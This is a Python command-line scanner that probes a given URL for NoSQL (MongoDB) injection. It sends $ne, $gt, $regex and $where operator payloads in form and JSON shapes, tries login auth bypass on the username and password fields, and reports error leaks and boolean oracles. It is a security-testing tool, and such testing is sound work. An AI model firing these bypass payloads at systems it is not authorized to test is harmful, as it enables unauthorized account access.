#!/usr/bin/env python3
"""Evidence-gated NoSQL injection detector (authorized targets only)."""

from __future__ import annotations

import argparse
import copy
import hashlib
import json
import re
import secrets
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, asdict
from typing import Any


ERROR_RE = re.compile(r"MongoError|\$where|unexpected token|E11000|CastError", re.I)
FAIL_RE = re.compile(r"invalid|incorrect|failed|denied|unauthorized|bad (?:login|credentials)", re.I)
SUCCESS_RE = re.compile(r"dashboard|welcome|logout|signed in|authenticated", re.I)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


@dataclass
class Response:
    status: int
    body: str
    location: str
    cookies: list[str]

    @property
    def digest(self) -> str:
        # Ignore common volatile tokens while retaining meaningful body differences.
        normalized = re.sub(r"\b[0-9a-f]{16,}\b|\b\d{10,}\b", "<volatile>", self.body, flags=re.I)
        return hashlib.sha256(normalized.encode()).hexdigest()[:16]


@dataclass
class Finding:
    severity: str
    kind: str
    parameter: str
    payload: str
    evidence: str


class Scanner:
    def __init__(self, args: argparse.Namespace):
        self.a = args
        self.opener = urllib.request.build_opener(NoRedirect)
        self.findings: list[Finding] = []
        self.errors: list[str] = []

    def request(self, params: list[tuple[str, str]] | None = None, body: Any = None) -> Response | None:
        method = self.a.method.upper()
        url = self.a.url
        data = None
        headers = {"User-Agent": "nosqli/1.0", "Accept": "*/*"}
        if body is not None:
            data = json.dumps(body, separators=(",", ":")).encode()
            headers["Content-Type"] = "application/json"
        elif params is not None:
            encoded = urllib.parse.urlencode(params).encode()
            if method == "GET":
                url += ("&" if "?" in url else "?") + encoded.decode()
            else:
                data = encoded
                headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            res = self.opener.open(req, timeout=self.a.timeout)
        except urllib.error.HTTPError as exc:
            res = exc  # redirects and HTTP errors still carry useful evidence
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            self.errors.append(str(exc))
            return None
        raw = res.read(self.a.max_body + 1)
        body_text = raw[: self.a.max_body].decode("utf-8", "replace")
        return Response(res.status, body_text, res.headers.get("Location", ""), res.headers.get_all("Set-Cookie") or [])

    def add_error(self, parameter: str, payload: str, response: Response, baseline: Response | None):
        match = ERROR_RE.search(response.body)
        if match and (baseline is None or not ERROR_RE.search(baseline.body)):
            key = ("error leak", parameter, match.group(0).lower())
            if not any((f.kind, f.parameter, ERROR_RE.search(f.evidence).group(0).lower() if ERROR_RE.search(f.evidence) else "") == key for f in self.findings):
                self.findings.append(Finding("HIGH", "error leak", parameter, payload,
                    f"Mongo-style signature {match.group(0)!r} in HTTP {response.status} response"))

    @staticmethod
    def success_flip(base: Response, probe: Response) -> str | None:
        if base.status == 200 and probe.status in (301, 302, 303, 307, 308):
            return f"HTTP status changed 200→{probe.status} (Location: {probe.location or '<none>'})"
        if not base.cookies and probe.cookies:
            return "failed baseline set no cookie; probe set " + probe.cookies[0].split(";", 1)[0]
        base_fail, probe_fail = bool(FAIL_RE.search(base.body)), bool(FAIL_RE.search(probe.body))
        if base_fail and not probe_fail and SUCCESS_RE.search(probe.body):
            return f"failure response changed to success content (body {base.digest}→{probe.digest})"
        return None

    def login_scan(self):
        token = "nosqli_" + secrets.token_hex(8)
        u, p = self.a.username_field, self.a.password_field
        baseline_pairs = [(u, token), (p, token)]
        baseline_json = {u: token, p: token}
        base = self.request(body=baseline_json) if self.a.json_login else self.request(params=baseline_pairs)
        if not base:
            return
        variants: list[tuple[str, str, Any]] = []
        for field in (u, p):
            if self.a.json_login:
                for op, value in (("$ne", None), ("$gt", ""), ("$regex", ".*")):
                    obj = dict(baseline_json); obj[field] = {op: value}
                    variants.append((field, json.dumps({op: value}), obj))
            else:
                for op, value in (("$ne", "x"), ("$gt", ""), ("$regex", ".*")):
                    pairs = [(k, v) for k, v in baseline_pairs if k != field] + [(f"{field}[{op}]", value)]
                    variants.append((field, f"{field}[{op}]={value}", pairs))
        # Many real login queries require both predicates to match. Probe the combined
        # shape as well as each field independently; this is the common full bypass.
        if self.a.json_login:
            for op, value in (("$ne", None), ("$gt", ""), ("$regex", ".*")):
                variants.append((f"{u}+{p}", json.dumps({u: {op: value}, p: {op: value}}),
                                 {u: {op: value}, p: {op: value}}))
        else:
            for op, value in (("$ne", "x"), ("$gt", ""), ("$regex", ".*")):
                pairs = [(f"{u}[{op}]", value), (f"{p}[{op}]", value)]
                variants.append((f"{u}+{p}", urllib.parse.urlencode(pairs), pairs))
        for field, label, value in variants:
            res = self.request(body=value) if self.a.json_login else self.request(params=value)
            if not res:
                continue
            self.add_error(field, label, res, base)
            evidence = self.success_flip(base, res)
            if evidence:
                self.findings.append(Finding("CRITICAL", "confirmed auth bypass", field, label, evidence))

    def generic_scan(self):
        if self.a.data is not None:
            try:
                template = json.loads(self.a.data)
            except json.JSONDecodeError as exc:
                raise SystemExit(f"invalid --data JSON: {exc}")
            paths = marker_paths(template)
            if not paths:
                raise SystemExit("--data must contain at least one string value equal to FUZZ")
            for path in paths:
                self.scan_json_marker(template, path)
        else:
            pairs = parse_params(self.a.param)
            if not pairs:
                raise SystemExit("supply --param NAME=VALUE or --data JSON containing FUZZ")
            targets = [k for k, v in pairs if v == "FUZZ"] or [k for k, _ in pairs]
            for target in dict.fromkeys(targets):
                self.scan_form_param(pairs, target)

    def scan_form_param(self, base_pairs: list[tuple[str, str]], target: str):
        baseline = self.request(params=[(k, "nosqli_plain" if k == target and v == "FUZZ" else v) for k, v in base_pairs])
        def shaped(op: str, val: str):
            return [(k, v) for k, v in base_pairs if k != target] + [(f"{target}[{op}]", val)]
        for op, val in (("$ne", "x"), ("$gt", ""), ("$regex", ".*"), ("$where", "{")):
            res = self.request(params=shaped(op, val))
            if res: self.add_error(target, f"{target}[{op}]={val}", res, baseline)
        self.boolean_check(target, f"{target}[$ne]=1", lambda: self.request(params=shaped("$ne", "1")),
                           f"{target}[$eq]=nosqli_nonexistent", lambda: self.request(params=shaped("$eq", "nosqli_nonexistent")))

    def scan_json_marker(self, template: Any, path: tuple[Any, ...]):
        name = ".".join(map(str, path))
        baseline_body = replace_path(template, path, "nosqli_plain")
        baseline = self.request(body=baseline_body)
        for op, val in (("$ne", None), ("$gt", ""), ("$regex", ".*"), ("$where", "{")):
            res = self.request(body=replace_path(template, path, {op: val}))
            if res: self.add_error(name, json.dumps({op: val}), res, baseline)
        self.boolean_check(name, '{"$ne":1}', lambda: self.request(body=replace_path(template, path, {"$ne": 1})),
                           '{"$eq":"nosqli_nonexistent"}', lambda: self.request(body=replace_path(template, path, {"$eq": "nosqli_nonexistent"})))

    def boolean_check(self, name: str, true_label: str, true_req, false_label: str, false_req):
        # Two samples of each side prevent a one-off dynamic response becoming a finding.
        tr = [true_req(), true_req()]; fr = [false_req(), false_req()]
        if all(tr + fr) and tr[0].digest == tr[1].digest and fr[0].digest == fr[1].digest and tr[0].digest != fr[0].digest:
            self.findings.append(Finding("HIGH", "injectable boolean oracle", name,
                f"{true_label} vs {false_label}",
                f"stable distinct bodies: {tr[0].digest} vs {fr[0].digest}"))


def marker_paths(value: Any, path=()):
    found = []
    if value == "FUZZ": found.append(path)
    elif isinstance(value, dict):
        for k, v in value.items(): found += marker_paths(v, path + (k,))
    elif isinstance(value, list):
        for i, v in enumerate(value): found += marker_paths(v, path + (i,))
    return found


def replace_path(value: Any, path: tuple[Any, ...], replacement: Any):
    result = copy.deepcopy(value); cursor = result
    for part in path[:-1]: cursor = cursor[part]
    if path: cursor[path[-1]] = replacement
    else: result = replacement
    return result


def parse_params(values: list[str]):
    result = []
    for item in values:
        if "=" not in item: raise SystemExit(f"invalid --param {item!r}; expected NAME=VALUE")
        result.append(tuple(item.split("=", 1)))
    return result


def parser():
    p = argparse.ArgumentParser(prog="nosqli", description="Evidence-gated NoSQL injection detector")
    p.add_argument("url"); p.add_argument("-X", "--method", default="POST")
    p.add_argument("-p", "--param", action="append", default=[], metavar="NAME=VALUE")
    p.add_argument("--data", help="JSON body template containing string FUZZ markers")
    p.add_argument("--login", action="store_true", help="run failed-login baseline and auth-bypass checks")
    p.add_argument("--username-field", default="username"); p.add_argument("--password-field", default="password")
    p.add_argument("--json-login", action="store_true", help="send login probes as JSON (default: form encoded)")
    p.add_argument("--timeout", type=float, default=5.0); p.add_argument("--max-body", type=int, default=1_000_000)
    p.add_argument("--json", action="store_true", help="machine-readable output")
    return p


def main():
    args = parser().parse_args()
    scanner = Scanner(args)
    try:
        scanner.login_scan() if args.login else scanner.generic_scan()
    except KeyboardInterrupt:
        scanner.errors.append("interrupted")
    report = {"target": args.url, "findings": [asdict(f) for f in scanner.findings], "errors": scanner.errors,
              "clean": not scanner.findings}
    if args.json: print(json.dumps(report, indent=2))
    elif scanner.findings:
        for f in scanner.findings: print(f"[{f.severity}] {f.kind}: {f.parameter}\n  payload: {f.payload}\n  evidence: {f.evidence}")
    else: print("CLEAN: no evidence-gated NoSQL injection findings")
    if scanner.errors and not args.json:
        print("Warnings: " + "; ".join(dict.fromkeys(scanner.errors)), file=sys.stderr)
    return 1 if scanner.findings else (2 if scanner.errors else 0)


if __name__ == "__main__": raise SystemExit(main())
